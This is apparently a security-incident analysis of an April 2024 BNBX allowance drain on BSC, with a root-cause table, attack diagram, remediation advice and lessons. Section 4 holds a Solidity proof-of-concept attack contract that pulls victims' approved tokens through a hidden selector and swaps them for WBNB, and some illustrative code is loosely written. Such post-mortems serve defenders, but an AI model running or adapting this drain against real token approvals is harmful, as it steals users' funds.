# BNBX — Victim Allowance Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | BNBX |
| **Chain** | BSC |
| **Loss** | ~5 ETH |
| **Attacker** | [0xe6e06030](https://bscscan.com/address/0xe6e06030b33593d140f224fc1cdd1b8ffe99e50a) |
| **Vulnerable Contract** | [0x389A9AE2](https://bscscan.com/address/0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24) |
| **BNBX Token** | [0xF6624577](https://bscscan.com/address/0xF662457774bb0729028EA681BB2C001790999999) |
| **Root Cause** | The vulnerable contract uses selector `0x11834d4c` to call `transferFrom()` on BNBX tokens pre-approved by victims, then swaps them for WBNB |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/BNBX_exp.sol) |

---

## 1. Vulnerability Overview

The BNBX vulnerable contract exposes a function via selector `0x11834d4c` that allows unauthorized transfer of BNBX tokens using the `allowance` granted by victims to that contract. The attacker enumerated victim addresses, queried their balances and allowances, drained tokens up to the approved limit, and swapped them for WBNB via PancakeSwap.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: selector 0x11834d4c function permits arbitrary transferFrom
// Hidden admin function inside BNBX contract — anyone can consume victim allowances

interface IBNBX {
    // selector: 0x11834d4c
    // Executes transferFrom from victim address to to address for amount
    function transferFromVictim(address victim, address to, uint256 amount) external;
}

// Attacker flow
for (address victim : victims) {
    uint256 allowed = BNBX.allowance(victim, vulnerableContract);
    uint256 bal     = BNBX.balanceOf(victim);
    uint256 amount  = min(allowed, bal);
    if (amount > 0) {
        // transferFrom victim → attacker via hidden selector
        vulnerableContract.call(
            abi.encodeWithSelector(0x11834d4c, victim, attacker, amount)
        );
    }
}

// ✅ Safe code: only the contract owner can call transferFrom
function adminTransfer(address from, address to, uint256 amount) external onlyOwner {
    _transfer(from, to, amount);
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: BNBX_decompiled.sol
contract BNBX {
    function transferFrom(address p0, address p1, uint256 p2) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Iterate victim list
  │         └─ Query BNBX.allowance(victim, 0x389A9AE2)
  │         └─ Query BNBX.balanceOf(victim)
  │
  ├─→ [2] For each victim, call selector 0x11834d4c
  │         └─ Transfer BNBX tokens from victim → attacker
  │
  ├─→ [3] Swap BNBX → WBNB (PancakeSwap)
  │         └─ Compute getReserves() + getAmountOut(), then swap()
  │
  └─→ [4] Drain ~5 ETH worth of WBNB
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBNBX is IERC20 {
    // Hidden admin selector: 0x11834d4c
}

interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract AttackContract {
    IBNBX       constant bnbx    = IBNBX(0xF662457774bb0729028EA681BB2C001790999999);
    address     constant vulnC   = 0x389A9AE29fbE53cca7bC8B7a4d9D0a04078e1C24;
    IPancakePair constant pair   = IPancakePair(/* WBNB-BNBX pair */);

    function testExploit(address[] calldata victims) external {
        // [1] Collect victim allowances
        for (uint i = 0; i < victims.length; i++) {
            uint256 allowed = bnbx.allowance(victims[i], vulnC);
            uint256 bal     = bnbx.balanceOf(victims[i]);
            uint256 amount  = allowed < bal ? allowed : bal;
            if (amount == 0) continue;

            // [2] Transfer tokens via hidden selector
            (bool ok,) = vulnC.call(
                abi.encodeWithSelector(0x11834d4c, victims[i], address(this), amount)
            );
            require(ok);
        }

        // [3] Swap BNBX → WBNB
        uint256 bnbxBal = bnbx.balanceOf(address(this));
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amountOut = getAmountOut(bnbxBal, r0, r1);
        bnbx.transfer(address(pair), bnbxBal);
        pair.swap(0, amountOut, address(this), "");
    }

    function getAmountOut(uint amtIn, uint rIn, uint rOut) internal pure returns (uint) {
        uint amtInFee = amtIn * 9975;
        return (amtInFee * rOut) / (rIn * 10000 + amtInFee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Allowance Drain (Hidden Selector) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct selector call) |
| **DApp Category** | Token Contract |
| **Impact** | Full drain of victim tokens (~5 ETH) |

## 6. Remediation Recommendations

1. **Remove hidden admin functions**: Delete any function that allows an external caller to execute `transferFrom` arbitrarily
2. **Selector audit**: Document all function selectors before deployment and review their access controls
3. **Unlimited allowance warning**: Warn users of the risks before granting an unlimited allowance
4. **Principle of least allowance**: Design the frontend to request only the minimum required approval amount

## 7. Lessons Learned

- Hidden admin selectors in token contracts can serve as backdoors that abuse user allowances.
- Users who grant an unlimited `approve` are exposed to every hidden function in that contract.
- All ABI functions of a deployed contract must be publicly verifiable; anonymous selectors should be treated as immediately suspicious.